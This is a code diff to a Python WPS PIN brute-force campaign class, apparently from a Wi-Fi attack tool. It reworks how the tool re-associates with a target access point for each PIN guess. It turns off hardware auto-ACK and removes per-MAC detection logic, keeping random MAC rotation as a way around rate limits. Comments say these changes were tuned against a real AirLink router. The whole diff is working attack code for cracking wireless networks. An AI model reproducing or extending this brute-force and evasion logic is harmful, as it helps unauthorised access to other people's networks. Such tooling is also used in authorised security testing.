@@ -154,13 +154,6 @@ class WpsCampaign(Campaign):
         self._oui_pin_count = len(oui_pins)
         self._common_pins = list(dict.fromkeys(oui_pins + list(pinmod.COMMON_PINS)))
 
-        # One-shot-per-MAC detection. Some APs answer the first WSC exchange from a client
-        # MAC then ignore it. _mac_reached_oracle = did the current MAC get a real reply;
-        # _ap_one_shot latches once we've seen the ignore, and from then we rotate
-        # proactively after each oracle result so no attempt is wasted on a spent MAC.
-        self._mac_reached_oracle = False
-        self._ap_one_shot = False
-
         # A silent timeout after M4/M6 is only *assumed* wrong (timeout-as-NACK). Once an
         # AP has proven it sends explicit NACKs, a silent drop is instead a LOST reply — our
         # HW auto-ACK'd the AP's M-frame so it won't resend — so we retry the same PIN rather
@@ -245,10 +238,13 @@ class WpsCampaign(Campaign):
     # ---- the sweep ----------------------------------------------------------
     async def _ensure_session(self) -> bool:
         if self.assoc is None:
-            # Arm active-monitor for THIS session's MAC (re-armed after every _rotate_mac) so
-            # the AP's M-frames are HW-ACKed — un-ACKed is too flaky for an 11k-PIN sweep.
-            armed = await self.iface.set_fake_mac(self.our_mac, str_to_mac(self.bssid))
-            self._ack = armed is not None
+            # Auto-ACK OFF (no active-monitor). Hardware ground-truth (AirLink): arming it HURTS —
+            # HW-ACKing the AP's M-frames kills the AP's own retransmit safety net, so any dropped
+            # frame is permanent (false first-half-wrong / missed M7). Un-ACKed lets the AP
+            # retransmit; our resends (association + registrar in-session) cover a dropped TX. Also
+            # frees WPS from needing active-monitor support on the card.
+            await self.iface.clear_fake_mac()
+            self._ack = False
             self.assoc = WpsAssociation(self.iface, self.bssid, self.target.ssid or "",
                                         self.channel, our_mac=self.our_mac)
             self.assoc.start()
@@ -260,12 +256,17 @@ class WpsCampaign(Campaign):
         return True
 
     async def _try(self, pin: str) -> AttemptOutcome:
-        """One PIN attempt over the kept-alive association."""
+        """One PIN attempt on a FRESH association. Hardware ground-truth (AirLink): the AP treats a
+        WSC exchange as one-shot per association — a 2nd exchange on a kept-alive assoc is refused
+        pre-oracle with 'Device Password Auth Failure' — so we re-associate per PIN, as reaver does."""
         if not await self._ensure_session():
             return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="assoc failed")
         self.transport.drain()
         reg = WpsRegistrar(self.transport, str_to_mac(self.bssid), self.our_mac)
-        return await reg.try_pin(pin)
+        try:
+            return await reg.try_pin(pin)
+        finally:
+            self._reset_session()   # fresh WSC session for the next PIN
 
     def _next_pin(self) -> Optional[str]:
         """The next candidate per the current phase, or None when exhausted."""
@@ -436,7 +437,7 @@ class WpsCampaign(Campaign):
                 self.state.attempts += 1
 
                 if self._should_retry_lost_reply(pin, out):
-                    self._rotate_mac()             # a fresh MAC may deliver the reply
+                    # Session already reset by _try; the retry re-associates fresh (same MAC).
                     if self.state.attempts % self._SAVE_EVERY == 0:
                         self._save_state()
                     continue                       # retry the SAME pin — do not advance
@@ -453,8 +454,6 @@ class WpsCampaign(Campaign):
                     self._save_state()
                     self.status = "found"
                     break
-
-                self._after_attempt_mac_check(out)
 
                 if self.state.attempts % self._SAVE_EVERY == 0:
                     self._save_state()
@@ -543,36 +542,23 @@ class WpsCampaign(Campaign):
         self.lock.note_progress()         # a lost reply isn't a lock; keep the strike clean
         return True
 
-    def _after_attempt_mac_check(self, out: AttemptOutcome) -> None:
-        """One-shot-per-MAC handling. Some APs (e.g. AirLink) answer the first WSC
-        exchange from a client MAC then ignore it. If this MAC already reached the oracle
-        and now gets a no-reply, that's the tell — latch _ap_one_shot; thereafter rotate
-        proactively after every oracle result so no attempt is wasted on a spent MAC.
-        A fresh MAC's first no-reply is left to the strike/lock path (far/rate-limited AP)."""
-        if out.reached_m1:
-            self._mac_reached_oracle = True
-            if self._ap_one_shot:
-                self._rotate_mac()
-        elif out.result is PinResult.TIMEOUT and self._mac_reached_oracle:
-            if not self._ap_one_shot:
-                self._ap_one_shot = True
-                self.log("[dim]AP answers once per MAC — rotating after each attempt[/dim]")
-            self.lock.note_progress()   # a spent MAC isn't a lock; clear the strike it added
-            self._rotate_mac()
-
-    def _rotate_mac(self) -> None:
-        """Tear down the association + transport and select a new random MAC address."""
+    def _reset_session(self) -> None:
+        """Drop the association + transport so the next attempt re-associates (keeps the MAC)."""
         if self.transport is not None:
             self.transport.stop()
         if self.assoc is not None:
             self.assoc.stop()
         self.assoc = None
         self.transport = None
+        self._last_attempt_sig = None
+
+    def _rotate_mac(self) -> None:
+        """Fresh random MAC (+ fresh session). Rate-limit fallback only — the AP is NOT
+        one-shot-per-MAC (proven on hardware), so this is not part of the normal loop."""
+        self._reset_session()
         old = self.our_mac
         self.our_mac = random_client_mac()
         logger.debug("WPS rotated MAC %s -> %s", old.hex(), self.our_mac.hex())
-        self._last_attempt_sig = None
-        self._mac_reached_oracle = False   # fresh MAC hasn't been engaged yet
 
     def _log_attempt(self, pin: str, out: AttemptOutcome,
                      prev_first_half: Optional[str]) -> None:
